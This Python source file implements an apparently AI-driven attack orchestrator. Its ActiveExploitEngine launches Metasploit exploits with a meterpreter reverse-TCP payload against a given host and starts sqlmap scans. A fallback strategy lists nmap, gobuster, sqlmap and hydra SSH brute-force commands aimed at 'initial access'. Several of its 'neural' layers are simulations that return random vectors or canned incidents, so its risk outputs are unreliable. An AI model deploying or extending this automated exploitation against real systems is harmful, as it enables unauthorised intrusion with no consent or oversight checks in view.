# orchestrator.py - Master Controller for All Intelligence Layers

import asyncio
import json
import uuid
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
from collections import defaultdict
import logging
import requests
import subprocess
import shlex
# Add missing imports
from sentinel_utils import SafetyCage, fetch_internet_intel

# Import pymetasploit3 if available, otherwise handle gracefully
try:
    import pymetasploit3.msfrpc as msfrpc
    MSF_AVAILABLE = True
except ImportError:
    MSF_AVAILABLE = False
    print("⚠️ pymetasploit3 not installed. Metasploit features disabled.")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("Orchestrator")

# ===== Define ActiveExploitEngine BEFORE SentinelOrchestrator =====
class ActiveExploitEngine:
    """Engine for launching active exploits via Metasploit and SQLMap"""
    
    def __init__(self):
        # Connect to Metasploit RPC (Ensure you ran: msfrpcd -P sentinel -S)
        self.msf = None
        if MSF_AVAILABLE:
            try:
                self.msf = msfrpc.MsfRpcClient('sentinel', port=55553)
                logger.info("🟢 Metasploit RPC Linked")
            except Exception as e:
                logger.error(f"🔴 Metasploit RPC Connection Failed: {e}")
        else:
            logger.warning("Metasploit support not available")

    def launch_msf_exploit(self, target, module, payload="linux/x64/meterpreter/reverse_tcp"):
        """Launch a Metasploit exploit"""
        if not self.msf: 
            return {"status": "error", "message": "MSF not connected"}
        
        try:
            exploit = self.msf.modules.use('exploit', module)
            exploit['RHOSTS'] = target
            result = exploit.execute(payload=payload)
            return {"status": "success", "result": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def trigger_sqlmap(self, target_url):
        """Trigger SQLMap scan"""
        # Basic subprocess call for SQLMap (or use the REST API)
        cmd = f"sqlmap -u {target_url} --batch --random-agent"
        try:
            # Using Popen for non-blocking execution
            process = subprocess.Popen(
                shlex.split(cmd), 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            )
            return {
                "status": "initiated", 
                "message": "SQLMap Scan Initiated",
                "pid": process.pid
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}


# ===== Define NeuralPipeline BEFORE SentinelOrchestrator =====
class NeuralPipeline:
    """
    Complete neural pipeline following the architecture diagram:
    
    1. Data Preprocessor (Feature Encoding + Norm)
    2. CNN Feature Extractor (256d vectors)
    3. Graph Builder (PyTorch GNN)
    4. MiniLM RAG (Embeddings + Top-K Retrieval)
    5. Bayesian Calibration Layer
    6. DeepSeek 1.3B (Reasoning)
    7. Final Output + Replay Buffer
    """
    
    def __init__(self, correlation_system=None, sentinel_brain=None):
        self.correlation = correlation_system
        self.sentinel = sentinel_brain
        self.replay_buffer = []
        self.model_versions = []
        
    async def process(self, input_data: Dict) -> Dict:
        """Process input through all neural layers"""
        
        pipeline_result = {
            'pipeline_id': str(uuid.uuid4()),
            'timestamp': datetime.utcnow().isoformat(),
            'layers': {},
            'final': {}
        }
        
        # ===== LAYER 1: DATA PREPROCESSOR =====
        features = self._preprocess_features(input_data)
        pipeline_result['layers']['preprocessor'] = {
            'feature_dim': len(features) if isinstance(features, list) else features.shape,
            'normalized': True
        }
        
        # ===== LAYER 2: CNN FEATURE EXTRACTOR =====
        cnn_output = {}
        if self.sentinel and hasattr(self.sentinel, 'layer1_cnn'):
            cnn_output = self.sentinel.layer1_cnn.detect_anomalies(
                input_data.get('packets', [])
            )
            latent_vector = cnn_output.get('pattern', [0] * 256)
        else:
            latent_vector = self._simulate_cnn_features(features)
        
        pipeline_result['layers']['cnn'] = {
            'latent_vector_dim': len(latent_vector),
            'anomaly_score': cnn_output.get('anomaly_score', 0.5)
        }
        
        # ===== LAYER 3: GRAPH BUILDER (GNN) =====
        if self.correlation and isinstance(self.correlation, dict) and self.correlation.get('attack_graph'):
            graph = self.correlation['attack_graph'].to_dict()
            gnn_paths = self._extract_gnn_paths(graph)
        else:
            graph = self._build_graph(input_data)
            gnn_paths = []
        
        pipeline_result['layers']['gnn'] = {
            'nodes': len(graph.get('nodes', [])),
            'edges': len(graph.get('edges', [])),
            'paths': gnn_paths[:3]
        }
        
        # ===== LAYER 4: MINILM RAG =====
        rag_results = []
        if self.correlation and isinstance(self.correlation, dict) and self.correlation.get('minilm_rag'):
            rag_results = self.correlation['minilm_rag'].retrieve_similar(
                self._create_dummy_event(input_data), 
                k=5
            )
        else:
            rag_results = self._simulate_rag(input_data.get('target', 'unknown'))
        
        pipeline_result['layers']['minilm'] = {
            'similar_incidents': len(rag_results),
            'top_matches': rag_results[:3] if rag_results else []
        }
        
        # ===== LAYER 5: BAYESIAN CALIBRATION =====
        if self.correlation and isinstance(self.correlation, dict) and self.correlation.get('bayesian_calibrator'):
            raw_risk = input_data.get('risk_score', 5.0)
            calibrated = self.correlation['bayesian_calibrator'].calibrate(
                raw_risk, 
                rag_results
            )
        else:
            calibrated = self._bayesian_calibration(
                input_data,
                len(rag_results)
            )
        
        pipeline_result['layers']['bayesian'] = calibrated
        
        # ===== LAYER 6: DEEPSEEK REASONING =====
        if self.correlation and isinstance(self.correlation, dict) and self.correlation.get('deepseek_reasoner'):
            reasoning = self.correlation['deepseek_reasoner'].reason(
                self._create_dummy_event(input_data),
                calibrated,
                rag_results
            )
        else:
            reasoning = self._deepseek_reasoning(input_data, calibrated)
        
        pipeline_result['layers']['deepseek'] = reasoning
        
        # ===== LAYER 7: FINAL OUTPUT =====
        pipeline_result['final'] = {
            'risk_score': calibrated.get('risk_score', 5.0),
            'confidence': calibrated.get('confidence', 0.7),
            'uncertainty': calibrated.get('uncertainty', 0.3),
            'explanation': reasoning.get('explanation', ''),
            'remediation': reasoning.get('remediation', ''),
            'recommended_actions': reasoning.get('recommended_actions', []),
            'attack_paths': gnn_paths[:2],
            'similar_incidents_count': len(rag_results)
        }
        
        # ===== LAYER 8: REPLAY BUFFER =====
        self._add_to_replay_buffer(pipeline_result)
        
        return pipeline_result
    
    def _preprocess_features(self, data: Dict) -> List[float]:
        """Layer 1: Feature encoding and normalization"""
        features = []
        
        # Encode target
        target = data.get('target', 'unknown')
        features.append(len(target) / 100)  # Normalized length
        
        # Encode ports
        ports = data.get('ports', [])
        features.append(len(ports) / 100)  # Port count
        features.append(sum(ports) / 65535 if ports else 0)  # Avg port
        
        # Encode vulnerabilities
        vulns = data.get('vulnerabilities', [])
        features.append(len(vulns) / 20)  # Vuln count
        critical_count = sum(1 for v in vulns if v.get('severity') == 'CRITICAL')
        features.append(critical_count / 10)
        
        # Pad to fixed size
        while len(features) < 50:
            features.append(0.0)
        
        return features[:50]
    
    def _simulate_cnn_features(self, features: List[float]) -> List[float]:
        """Simulate CNN feature extraction (256d)"""
        import numpy as np
        
        # Use features as seed for deterministic output
        seed = int(sum(features) * 1000) if features else 42
        np.random.seed(seed)
        
        # Generate 256-dim latent vector
        latent = np.random.randn(256).tolist()
        
        # Normalize
        magnitude = np.linalg.norm(latent)
        return [x / magnitude for x in latent]
    
    def _build_graph(self, data: Dict) -> Dict:
        """Build graph from input data"""
        nodes = []
        edges = []
        
        # Initial node
        nodes.append({'id': 'initial', 'label': 'Initial', 'type': 'state'})
        
        # Service nodes
        for i, service in enumerate(data.get('services', [])[:3]):
            node_id = f'service_{i}'
            nodes.append({
                'id': node_id,
                'label': service.get('name', f'service_{i}'),
                'type': 'service'
            })
            edges.append({'from': 'initial', 'to': node_id})
        
        # Vulnerability nodes
        for i, vuln in enumerate(data.get('vulnerabilities', [])[:3]):
            node_id = f'vuln_{i}'
            nodes.append({
                'id': node_id,
                'label': vuln.get('name', f'vuln_{i}')[:20],
                'type': 'vulnerability'
            })
            
            # Connect to random service
            if nodes:
                edges.append({'from': nodes[-2]['id'], 'to': node_id})
        
        return {'nodes': nodes, 'edges': edges}
    
    def _extract_gnn_paths(self, graph: Dict) -> List[Dict]:
        """Extract GNN paths from graph"""
        paths = []
        
        nodes = graph.get('nodes', [])
        edges = graph.get('edges', [])
        
        # Find paths from initial to vulnerabilities
        for edge in edges:
            if edge.get('to', '').startswith('vuln'):
                paths.append({
                    'path': [edge.get('from', ''), edge.get('to', '')],
                    'score': 0.7
                })
        
        return paths
    
    def _simulate_rag(self, target: str) -> List[Dict]:
        """Simulate RAG retrieval"""
        return [
            {
                'incident_id': 'inc_001',
                'similarity': 0.92,
                'event_type': 'SQL_INJECTION',
                'success': True,
                'remediation': 'Use parameterized queries'
            },
            {
                'incident_id': 'inc_002',
                'similarity': 0.87,
                'event_type': 'XSS',
                'success': True,
                'remediation': 'Implement CSP'
            }
        ]
    
    def _bayesian_calibration(self, data: Dict, similar_count: int) -> Dict:
        """Bayesian calibration simulation"""
        raw_risk = data.get('risk_score', 5.0)
        
        # Prior
        prior = 0.5
        
        # Likelihood from similar incidents
        if similar_count > 0:
            likelihood = raw_risk / 10
            evidence = similar_count / 10
        else:
            likelihood = 0.5
            evidence = 0.5
        
        # Bayesian update
        posterior = (likelihood * prior) / (likelihood * prior + (1 - likelihood) * (1 - prior) + 1e-8)
        
        # Uncertainty decreases with evidence
        uncertainty = 1.0 / (1.0 + evidence * similar_count)
        confidence = 1.0 - uncertainty
        
        return {
            'risk_score': round(posterior * 10, 2),
            'confidence': round(confidence, 2),
            'uncertainty': round(uncertainty, 2),
            'posterior_probability': round(posterior, 3),
            'evidence_strength': round(evidence, 2)
        }
    
    def _deepseek_reasoning(self, data: Dict, calibrated: Dict) -> Dict:
        """DeepSeek reasoning simulation"""
        target = data.get('target', 'unknown')
        risk = calibrated.get('risk_score', 5.0)
        
        if risk >= 8:
            level = "CRITICAL"
            urgency = "immediate"
        elif risk >= 6:
            level = "HIGH"
            urgency = "urgent"
        elif risk >= 4:
            level = "MEDIUM"
            urgency = "moderate"
        else:
            level = "LOW"
            urgency = "routine"
        
        return {
            'explanation': f"Analysis of {target} reveals {level.lower()} risk security issues. "
                          f"Based on Bayesian calibration with {calibrated.get('confidence', 0.7)*100:.0f}% confidence.",
            'remediation': f"Address vulnerabilities with {urgency} priority. Apply security patches and update configurations.",
            'recommended_actions': [
                f"Run comprehensive scan on {target}",
                "Review access logs for suspicious activity",
                "Implement additional monitoring"
            ],
            'risk_level': level,
            'urgency': urgency
        }
    
    def _create_dummy_event(self, data: Dict):
        """Create dummy event for RAG retrieval"""
        try:
            from correlation_engine import SecurityEvent, EventType
            
            return SecurityEvent(
                event_id=str(uuid.uuid4()),
                event_type=EventType.UNKNOWN,
                severity=data.get('risk_score', 5.0),
                asset=data.get('target', 'unknown'),
                evidence={},
                timestamp=datetime.utcnow(),
                source_tool='neural_pipeline'
            )
        except ImportError:
            # Return a dict if correlation_engine not available
            return {
                'event_id': str(uuid.uuid4()),
                'event_type': 'UNKNOWN',
                'severity': data.get('risk_score', 5.0),
                'asset': data.get('target', 'unknown'),
                'evidence': {},
                'timestamp': datetime.utcnow().isoformat(),
                'source_tool': 'neural_pipeline'
            }
    
    def _add_to_replay_buffer(self, result: Dict):
        """Add result to replay buffer for retraining"""
        self.replay_buffer.append({
            'pipeline_id': result['pipeline_id'],
            'timestamp': result['timestamp'],
            'final': result['final'],
            'features': result.get('layers', {}).get('cnn', {}).get('latent_vector_dim'),
            'gnn_nodes': result.get('layers', {}).get('gnn', {}).get('nodes')
        })
        
        # Keep last 100
        if len(self.replay_buffer) > 100:
            self.replay_buffer = self.replay_buffer[-100:]
    
    def retrain(self, epochs: int = 10):
        """Layer 6: Retrain models on hard samples"""
        # This would connect to Colab for actual training
        if len(self.replay_buffer) < 10:
            return {'status': 'insufficient_samples', 'samples': len(self.replay_buffer)}
        
        # Export weights for retraining
        weights_file = f"model_weights_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        
        # In production, would trigger Colab training here
        self.model_versions.append({
            'version': len(self.model_versions) + 1,
            'timestamp': datetime.utcnow().isoformat(),
            'samples_used': len(self.replay_buffer),
            'weights_file': weights_file
        })
        
        return {
            'status': 'retraining_initiated',
            'model_version': len(self.model_versions),
            'samples': len(self.replay_buffer),
            'weights_file': weights_file
        }


class SentinelOrchestrator:
    """
    Master orchestrator connecting:
    - Correlation Engine (real-time events)
    - Intelligence Engine (9-level reasoning)
    - Sentinel Brain (neural layers)
    - Emily AI (exploit analysis)
    - RAG System (knowledge retrieval)
    """

    def __init__(self):
        # Component references
        self.correlation_system = None
        self.intelligence_engine = None
        self.sentinel_brain = None
        self.emily_ai = None
        self.rag_system = None
        self.safety_cage = SafetyCage()
        
        # Initialize the Exploit Engine (only once)
        try:
            self.exploit_engine = ActiveExploitEngine()
        except Exception as e:
            logger.error(f"Could not initialize Exploit Engine: {e}")
            self.exploit_engine = None
        
        # Neural pipeline (will be initialized in initialize())
        self.neural_pipeline = None
        
        # Socket.IO reference (will be set by web app)
        self.sio = None
        
        # Pipeline state
        self.pipeline_stats = {
            'total_analyses': 0,
            'avg_processing_time': 0,
            'last_run': None
        }
        
        # Event bus for internal communication
        self.event_handlers = defaultdict(list)
        
        print("\n" + "=" * 60)
        print(" 🧠 SENTINEL ORCHESTRATOR INITIALIZED".center(60))
        print("=" * 60)

    def initialize(self, 
                   correlation_system=None,
                   intelligence_engine=None,
                   sentinel_brain=None,
                   emily_ai=None,
                   rag_system=None):
        """Master initialization to link all system components."""
        self.correlation_system = correlation_system
        self.intelligence_engine = intelligence_engine
        self.sentinel_brain = sentinel_brain
        self.emily_ai = emily_ai
        self.rag_system = rag_system
        
        # NEW: Initialize neural pipeline
        self.neural_pipeline = NeuralPipeline(
            correlation_system=correlation_system,
            sentinel_brain=sentinel_brain
        )
        
        # Establish connections between components
        self._connect_components()
        
        logger.info("✅ Orchestrator components successfully linked.")
        logger.info("✅ Neural pipeline initialized with all 6 layers")
        return self
    
    async def run_neural_pipeline(self, input_data: Dict) -> Dict:
        """Run the complete neural pipeline following the diagram"""
        if not self.neural_pipeline:
            return {'error': 'Neural pipeline not initialized'}
        
        result = await self.neural_pipeline.process(input_data)
        
        # Broadcast to UI
        await self.broadcast_to_ui('PIPELINE_UPDATE', result)
        
        return result
    
    async def retrain_models(self):
        """Trigger retraining on hard samples"""
        if not self.neural_pipeline:
            return {'error': 'Neural pipeline not initialized'}
        
        return self.neural_pipeline.retrain()

    def set_socketio(self, sio):
        """Set Socket.IO instance for broadcasting to UI"""
        self.sio = sio

    async def executive_agent_loop(self, query: str):
        """
        Main logic loop for the AI Copilot.
        Processes user queries, gathers RAG context, and consults the Sentinel Brain.
        """
        logger.info(f"🌀 Agent loop started for query: {query}")
        
        # 1. Gather Context via RAG
        context = ""
        if self.rag_system:
            try:
                # Check if rag_system has search method
                if hasattr(self.rag_system, 'search'):
                    context = await self.rag_system.search(query)
                else:
                    context = str(self.rag_system)
            except Exception as e:
                logger.error(f"RAG Search failed: {e}")

        # 2. Decision: Do we need the internet? (Check for live intel keywords)
        needs_internet = any(word in query.lower() for word in ['latest', 'search', 'cve', 'news', 'live'])
        internet_data = ""
        if needs_internet:
            try:
                internet_data = await fetch_internet_intel(query)
            except Exception as e:
                logger.error(f"Internet intel fetch failed: {e}")

        # 3. Consult the Sentinel Brain (The Sentient Layer)
        thought_process = {
            "thought": "Analyzing request through neural layers...",
            "plan": [],
            "status": "processing",
            "confidence": 0.5,
            "answer": "Analysis complete."
        }

        if self.sentinel_brain:
            try:
                # Construct input for the 7-layer brain
                brain_input = {
                    "query": query,
                    "context": context,
                    "internet_data": internet_data
                }
                
                # The .think() method processes through CNN, GNN, BNN, and Emily AI
                if hasattr(self.sentinel_brain, 'think'):
                    brain_response = self.sentinel_brain.think(brain_input)
                    
                    # Extract reasoning from Layer 6 (Emily) or Layer 4 (BNN)
                    thought_process = {
                        "thought": brain_response.get('layer6_emily', {}).get('reasoning') or \
                                   brain_response.get('thought_stream', "I'm analyzing the data patterns."),
                        "plan": brain_response.get('layer2_gnn', {}).get('strategy', []),
                        "confidence": brain_response.get('layer4_bnn', {}).get('confidence', 0.5),
                        "suggested_command": brain_response.get('layer6_emily', {}).get('command', None),
                        "answer": brain_response.get('final_decision', "Analysis complete.")
                    }
            except Exception as e:
                logger.error(f"Sentinel Brain thinking failed: {e}")

        # 4. Format return for fast6.py endpoint
        return {
            "status": "success",
            "query": query,
            "thought": thought_process["thought"],
            "answer": thought_process.get("answer"),
            "plan": thought_process["plan"],
            "confidence": thought_process.get("confidence", 0.5),
            "command": thought_process.get("suggested_command"),
            "source": "internet" if internet_data else "local_brain",
            "timestamp": datetime.now().isoformat()
        }
    
    def _connect_components(self):
        """Establish connections between components"""
        
        # 1. Connect Correlation Engine to Sentinel Brain
        if self.correlation_system and self.sentinel_brain:
            # Subscribe correlation events to sentinel
            if hasattr(self.correlation_system, 'event_bus'):
                # Handle both dict and object access
                event_bus = self.correlation_system.get('event_bus') if isinstance(self.correlation_system, dict) else getattr(self.correlation_system, 'event_bus', None)
                if event_bus and hasattr(event_bus, 'subscribe'):
                    event_bus.subscribe(
                        lambda e: self.sentinel_brain.layer7_spine.publish_event(
                            'correlation_event', e if isinstance(e, dict) else e.to_dict()
                        )
                    )
            
            # Subscribe sentinel decisions to correlation
            if hasattr(self.sentinel_brain, 'layer7_spine'):
                self.sentinel_brain.layer7_spine.subscribe(
                    'decision_made',
                    lambda d: self._handle_sentinel_decision(d)
                )
        
        # 2. Connect Intelligence Engine to Emily AI
        if self.intelligence_engine and self.emily_ai:
            # Pass strategies to Emily for payload generation
            if hasattr(self.intelligence_engine, 'llm_reasoner'):
                self.intelligence_engine.llm_reasoner.emily_callback = self.emily_ai.analyze_target
        
        # 3. Connect RAG to all components
        if self.rag_system:
            if self.intelligence_engine and hasattr(self.intelligence_engine, 'set_vector_store'):
                self.intelligence_engine.set_vector_store(self.rag_system)
            if self.sentinel_brain and hasattr(self.sentinel_brain, 'layer3_minilm'):
                self.sentinel_brain.layer3_minilm = self.rag_system
        
        logger.info("✓ Component connections established")
    
    def _handle_sentinel_decision(self, decision: Dict):
        """Process decisions from Sentinel Brain"""
        if decision.get('target_layer') == 'emily' and self.emily_ai:
            # Trigger Emily AI with context
            context = decision.get('context', {})
            asyncio.create_task(self._run_emily_analysis(context))
    
    async def _run_emily_analysis(self, context: Dict):
        """Run Emily AI analysis asynchronously"""
        try:
            if hasattr(self.emily_ai, 'analyze_target'):
                result = self.emily_ai.analyze_target(
                    {'target': context.get('target', 'unknown')},
                    context.get('vulnerabilities', [])
                )
                logger.info(f"✅ Emily AI analysis complete: {result.get('risk_level')}")
        except Exception as e:
            logger.error(f"❌ Emily AI analysis failed: {e}")

    def get_attack_paths(self, target_node_id: str):
        """Get attack paths for a target node"""
        if not self.correlation_system:
            return []
            
        # Handle both dict and object access
        if isinstance(self.correlation_system, dict):
            attack_graph = self.correlation_system.get('attack_graph', {})
            if hasattr(attack_graph, 'to_dict'):
                graph = attack_graph.to_dict()
            else:
                graph = attack_graph
        else:
            graph = self.correlation_system.get('attack_graph', {}).to_dict() if hasattr(self.correlation_system, 'get') else {}
        
        paths = []
        
        # Get nodes list safely
        nodes = graph.get('nodes', []) if isinstance(graph, dict) else []
        edges = graph.get('edges', []) if isinstance(graph, dict) else []
        
        # Find target node
        target_node = next((n for n in nodes if n.get('id') == target_node_id), None)
        if not target_node:
            return []

        # Simple back-trace logic to find how we got to the vulnerability
        for edge in edges:
            if edge.get('to') == target_node_id:
                paths.append({
                    "from": edge.get('from'),
                    "to": target_node_id,
                    "confidence": target_node.get('score', 0.8)
                })
        return paths
    
    def run_unified_pipeline(self, 
                           scan_result: Dict,
                           target: str,
                           user_id: int,
                           db_session=None) -> Dict:
        """
        Run the complete intelligence pipeline through all layers
        
        Flow matches architecture diagram:
        1. Feature Builder (Context)
        2. Retrieval Layer (MiniLM + Vector)
        3. Memory Layer (Redis)
        4. Risk Engine
        5. Case Correlator
        6. LLM-2 (Deep Reasoning)
        7. Chain Scoring
        8. Bayesian Confidence
        9. Attack Graph Generator
        10. Web Renderer Data
        """
        start_time = time.time()
        pipeline_id = str(uuid.uuid4())
        
        pipeline_result = {
            'pipeline_id': pipeline_id,
            'timestamp': datetime.utcnow().isoformat(),
            'target': target,
            'user_id': user_id,
            'layers': {},
            'final': {}
        }
        
        # ===== LAYER 1: Feature Builder (Context) =====
        features = self._build_features(scan_result, target)
        pipeline_result['layers']['features'] = features
        logger.info(f"📊 Layer 1: Feature Builder - {len(features.get('open_ports', []))} ports, {len(features.get('vulnerabilities', []))} vulns")
        
        # ===== LAYER 2: Retrieval Layer (MiniLM + Vector) =====
        similar_cases = []
        if self.rag_system:
            try:
                query = f"{target} {' '.join([s.get('name','') for s in features.get('services', [])])}"
                if hasattr(self.rag_system, 'search'):
                    similar_cases = self.rag_system.search(query, k=5)
            except Exception as e:
                logger.error(f"RAG search failed: {e}")
        pipeline_result['layers']['retrieval'] = {
            'cases_found': len(similar_cases),
            'cases': similar_cases
        }
        logger.info(f"🔍 Layer 2: Retrieval - Found {len(similar_cases)} similar cases")
        
        # ===== LAYER 3: Memory Layer (Redis) =====
        historical = self._get_historical_patterns(target, user_id, db_session)
        pipeline_result['layers']['memory'] = {
            'historical_count': len(historical),
            'recent': historical[:3]
        }
        
        # ===== LAYER 4: Risk Engine =====
        risk = self._calculate_risk(features, similar_cases)
        pipeline_result['layers']['risk'] = risk
        logger.info(f"⚠️ Layer 4: Risk Engine - Score: {risk.get('score', 0)} ({risk.get('level', 'UNKNOWN')})")
        
        # ===== LAYER 5: Case Correlator =====
        correlation = self._correlate_cases(features, historical, similar_cases)
        pipeline_result['layers']['correlation'] = correlation
        
        # ===== LAYER 6: LLM-2 (Deep Reasoning) =====
        reasoning = self._deep_reasoning(features, risk, correlation, similar_cases)
        pipeline_result['layers']['reasoning'] = reasoning
        logger.info(f"🧠 Layer 6: LLM-2 - Confidence: {reasoning.get('confidence', 0):.2f}")
        
        # ===== LAYER 7: Chain Scoring =====
        chain_score = self._score_attack_chains(
            reasoning.get('strategy', {}).get('phases', []),
            features
        )
        pipeline_result['layers']['chain_score'] = chain_score
        
        # ===== LAYER 8: Bayesian Confidence =====
        confidence = self._calculate_confidence(chain_score, historical, features)
        pipeline_result['layers']['confidence'] = confidence
        
        # ===== LAYER 9: Attack Graph Generator =====
        attack_graph = self._generate_attack_graph(
            features, chain_score, confidence, reasoning.get('strategy', {})
        )
        pipeline_result['layers']['attack_graph'] = attack_graph
        
        # ===== FINAL: Web Renderer Data =====
        processing_time = time.time() - start_time
        
        pipeline_result['final'] = {
            'risk_score': risk.get('score', 0),
            'risk_level': risk.get('level', 'INFO'),
            'confidence': confidence.get('confidence', 0),
            'uncertainty': confidence.get('uncertainty', 0),
            'attack_probability': chain_score.get('likelihood', 0),
            'attack_impact': chain_score.get('impact', 0),
            'correlation_score': correlation.get('correlation_score', 0),
            'recommendations': reasoning.get('recommendations', [])[:3],
            'attack_paths': attack_graph.get('paths', [])[:3],
            'graph_data': attack_graph.get('visualization', {}),
            'processing_time_ms': int(processing_time * 1000)
        }
        
        # Update stats
        self.pipeline_stats['total_analyses'] += 1
        self.pipeline_stats['avg_processing_time'] = (
            self.pipeline_stats['avg_processing_time'] * 0.9 + processing_time * 0.1
        )
        self.pipeline_stats['last_run'] = pipeline_result['timestamp']
        
        logger.info(f"✅ Pipeline complete in {processing_time:.2f}s")
        
        return pipeline_result
    
    def _build_features(self, scan_result: Dict, target: str) -> Dict:
        """Build structured features from scan result"""
        return {
            'target': target,
            'open_ports': scan_result.get('ports', []),
            'services': scan_result.get('services', []),
            'vulnerabilities': scan_result.get('vulnerabilities', []),
            'os_info': scan_result.get('os', 'unknown'),
            'ssl_info': scan_result.get('ssl', {}),
            'http_headers': scan_result.get('headers', {}),
            'port_count': len(scan_result.get('ports', [])),
            'vuln_count': len(scan_result.get('vulnerabilities', [])),
            'risk_indicators': {
                'has_critical_ports': any(p in [21,22,23,3389,3306,5432] for p in scan_result.get('ports', [])),
                'has_web_server': any(s.get('name') in ['http','https'] for s in scan_result.get('services', [])),
                'has_database': any(s.get('name') in ['mysql','postgresql','mongodb'] for s in scan_result.get('services', []))
            }
        }
    
    def _get_historical_patterns(self, target: str, user_id: int, db_session) -> List[Dict]:
        """Get historical patterns from database"""
        historical = []
        
        if db_session:
            try:
                # Try to import models only if db_session is provided
                try:
                    from fast4 import AttackHistory, ScanHistory
                except ImportError:
                    logger.warning("Could not import AttackHistory/ScanHistory models")
                    return historical
                
                attacks = db_session.query(AttackHistory).filter(
                    AttackHistory.user_id == user_id,
                    AttackHistory.target.like(f'%{target}%')
                ).order_by(AttackHistory.timestamp.desc()).limit(10).all()
                
                for attack in attacks:
                    historical.append({
                        'type': 'attack',
                        'tool': attack.tool_used,
                        'success': attack.success,
                        'timestamp': attack.timestamp.isoformat() if attack.timestamp else None
                    })
                
                scans = db_session.query(ScanHistory).filter(
                    ScanHistory.user_id == user_id,
                    ScanHistory.target.like(f'%{target}%')
                ).order_by(ScanHistory.timestamp.desc()).limit(10).all()
                
                for scan in scans:
                    vulns = []
                    if scan.vulnerabilities:
                        try:
                            vulns = json.loads(scan.vulnerabilities)
                        except:
                            vulns = []
                    
                    historical.append({
                        'type': 'scan',
                        'tool': scan.tool_used,
                        'vulns': vulns,
                        'timestamp': scan.timestamp.isoformat() if scan.timestamp else None
                    })
                    
            except Exception as e:
                logger.error(f"Error fetching historical patterns: {e}")
        
        return sorted(historical, key=lambda x: x.get('timestamp', ''), reverse=True)
    
    def _calculate_risk(self, features: Dict, similar_cases: List[Dict]) -> Dict:
        """Calculate risk score"""
        if self.correlation_system:
            try:
                # Handle both dict and object access
                if isinstance(self.correlation_system, dict):
                    risk_engine = self.correlation_system.get('risk_engine')
                    if risk_engine:
                        return {
                            'score': getattr(risk_engine, 'overall_score', 0),
                            'level': getattr(risk_engine, 'get_risk_level', lambda: 'UNKNOWN')(),
                            'assets': getattr(risk_engine, 'asset_scores', {})
                        }
                else:
                    # Object access
                    return {
                        'score': self.correlation_system['risk_engine'].overall_score,
                        'level': self.correlation_system['risk_engine'].get_risk_level(),
                        'assets': self.correlation_system['risk_engine'].asset_scores
                    }
            except Exception as e:
                logger.error(f"Error using correlation system risk: {e}")
        
        # Simple fallback risk calculation
        score = 0
        score += len(features.get('open_ports', [])) * 0.5
        score += features.get('vuln_count', 0) * 2
        
        for vuln in features.get('vulnerabilities', []):
            if vuln.get('severity') == 'CRITICAL':
                score += 3
            elif vuln.get('severity') == 'HIGH':
                score += 2
        
        score = min(10, score)
        
        level = 'INFO'
        if score >= 8:
            level = 'CRITICAL'
        elif score >= 6:
            level = 'HIGH'
        elif score >= 4:
            level = 'MEDIUM'
        elif score >= 2:
            level = 'LOW'
        
        return {'score': score, 'level': level, 'assets': {}}
    
    def _correlate_cases(self, features: Dict, historical: List[Dict], similar: List[Dict]) -> Dict:
        """Correlate current case with historical patterns"""
        correlation_score = 0.5
        matched_rules = []
        
        # Simple rule matching
        if features.get('vuln_count', 0) > 0 and any(h.get('success') for h in historical[:3]):
            correlation_score += 0.2
            matched_rules.append({'rule': 'Historical success with vulnerabilities', 'weight': 0.8})
        
        if features.get('risk_indicators', {}).get('has_critical_ports'):
            correlation_score += 0.1
            matched_rules.append({'rule': 'Critical ports open', 'weight': 0.7})
        
        if similar:
            correlation_score += 0.15
            matched_rules.append({'rule': 'Similar cases found', 'weight': 0.75})
        
        return {
            'correlation_score': min(1.0, correlation_score),
            'matched_rules': matched_rules,
            'attack_chain_probability': correlation_score * 0.8,
            'recommended_actions': [
                'Run detailed vulnerability scan',
                'Check for known exploits',
                'Attempt initial access vectors'
            ] if correlation_score > 0.6 else ['Gather more information']
        }
    
    def _deep_reasoning(self, features: Dict, risk: Dict, correlation: Dict, similar: List[Dict]) -> Dict:
        """Deep reasoning using available AI components"""
        
        # Try Intelligence Engine first
        if self.intelligence_engine:
            try:
                # Convert features to expected format
                scan_result = {
                    'ports': features.get('open_ports', []),
                    'services': features.get('services', []),
                    'vulnerabilities': features.get('vulnerabilities', []),
                    'os': features.get('os_info', 'unknown')
                }
                
                if hasattr(self.intelligence_engine, 'analyze'):
                    analysis = self.intelligence_engine.analyze(scan_result, [], similar)
                    
                    return {
                        'strategy': analysis.get('strategies', []),
                        'confidence': analysis.get('confidence', 0.5),
                        'recommendations': [s.get('primary_approach', '') for s in analysis.get('strategies', [])[:3]],
                        'critique': analysis.get('critique', {}),
                        'mode': analysis.get('mode', {}),
                        'source': 'intelligence_engine'
                    }
            except Exception as e:
                logger.error(f"Intelligence Engine reasoning failed: {e}")
        
        # Try Sentinel Brain
        if self.sentinel_brain:
            try:
                if hasattr(self.sentinel_brain, 'think'):
                    thought = self.sentinel_brain.think({
                        'target': features.get('target'),
                        'ports': features.get('open_ports', []),
                        'services': features.get('services', []),
                        'vulnerabilities': features.get('vulnerabilities', []),
                        'goal': 'initial_access'
                    })
                    
                    bnn = thought.get('layer4_bnn', {})
                    emily = thought.get('execution', {}).get('reasoning', {})
                    
                    return {
                        'strategy': emily.get('strategy', []),
                        'confidence': bnn.get('confidence', 0.5),
                        'recommendations': [s.get('action', '') for s in emily.get('strategy', [])[:3]],
                        'critique': emily.get('critique', {}),
                        'mode': {'mode': 'sentinel_brain'},
                        'source': 'sentinel_brain'
                    }
            except Exception as e:
                logger.error(f"Sentinel Brain reasoning failed: {e}")
        
        # Fallback reasoning
        return {
            'strategy': {
                'phases': [
                    {
                        'name': 'Reconnaissance',
                        'tools': ['nmap', 'gobuster'],
                        'commands': [f"nmap -sV {features.get('target')}", f"gobuster dir -u {features.get('target')}"]
                    },
                    {
                        'name': 'Exploitation',
                        'tools': ['sqlmap', 'hydra'],
                        'commands': [f"sqlmap -u {features.get('target')}", f"hydra -l admin -P wordlist.txt ssh://{features.get('target')}"]
                    }
                ]
            },
            'confidence': 0.5,
            'recommendations': ['Run nmap scan', 'Check for web vulnerabilities'],
            'critique': {'weaknesses': ['Limited information'], 'strengths': []},
            'mode': {'mode': 'fallback'},
            'source': 'fallback'
        }
    
